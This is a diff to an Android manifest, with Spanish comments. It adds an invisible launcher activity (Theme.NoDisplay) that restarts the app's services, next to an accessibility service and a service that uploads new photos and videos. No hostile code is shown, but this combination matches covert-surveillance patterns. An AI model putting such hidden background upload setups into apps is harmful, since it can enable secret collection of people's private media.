@@ -25,6 +25,17 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Sin UI: abrirla desbloquea el paquete (stopped/DuraSpeed) y arranca el servicio. -->
+        <activity
+            android:name=".LauncherActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.NoDisplay">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
         <!-- Observa fotos/videos nuevos y los sube. -->
         <service android:name=".MediaWatcherService" android:exported="false" />
 
